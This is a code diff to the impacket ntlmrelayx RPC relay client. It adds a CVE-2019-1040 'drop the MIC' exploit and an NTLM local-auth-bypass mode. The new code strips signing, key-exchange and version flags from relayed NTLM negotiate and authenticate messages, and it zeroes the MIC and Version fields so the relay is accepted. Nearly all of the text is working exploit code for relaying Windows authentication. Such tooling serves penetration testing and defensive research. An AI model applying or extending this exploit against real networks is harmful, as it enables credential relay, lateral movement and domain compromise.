@@ -18,7 +18,7 @@ from struct import unpack
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenResp
 
 from impacket.dcerpc.v5 import transport, rpcrt, epm, tsch, icpr
@@ -174,6 +174,18 @@ class RPCRelayClient(ProtocolClient):
         return True
 
     def sendNegotiate(self, auth_data):
+        # When exploiting CVE-2019-1040 or NTLM local auth bypass, remove message signing flags
+        if self.serverConfig.remove_mic or self.serverConfig.remove_mic_partial:
+            negoMessage = NTLMAuthNegotiate()
+            negoMessage.fromString(auth_data)
+
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+
+            auth_data = negoMessage.getData()
+
         bindResp = self.session.sendBindType1(self.endpoint_uuid, auth_data)
 
         challenge = NTLMAuthChallenge()
@@ -187,6 +199,35 @@ class RPCRelayClient(ProtocolClient):
             auth_data = respToken2['ResponseToken']
         else:
             auth_data = authenticateMessageBlob
+
+        # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
+        if self.serverConfig.remove_mic:
+            authMessage = NTLMAuthChallengeResponse()
+            authMessage.fromString(auth_data)
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+            authMessage['MIC'] = b''
+            authMessage['MICLen'] = 0
+            authMessage['Version'] = b''
+            authMessage['VersionLen'] = 0
+            auth_data = authMessage.getData()
+        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        elif self.serverConfig.remove_mic_partial:
+            authMessage = NTLMAuthChallengeResponse()
+            authMessage.fromString(auth_data)
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            # Do NOT remove KEY_EXCH or VERSION flags
+            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+            auth_data = authMessage.getData()
 
         self.session.sendBindType3(auth_data)
 
